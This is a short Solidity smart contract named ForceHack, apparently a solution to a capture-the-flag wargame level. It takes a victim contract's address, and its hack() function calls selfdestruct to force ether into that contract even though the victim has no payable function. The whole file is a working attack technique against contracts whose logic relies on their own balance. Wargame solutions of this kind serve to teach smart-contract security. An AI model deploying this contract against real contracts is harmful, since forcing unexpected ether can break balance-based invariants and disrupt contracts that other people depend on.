pragma solidity ^0.8.0;

contract ForceHack {
  address payable victimContractAddress;

  constructor(address payable _victimContractAddress) payable {
    victimContractAddress = _victimContractAddress;
  }

  function hack() external {
    selfdestruct(victimContractAddress);
  }
}
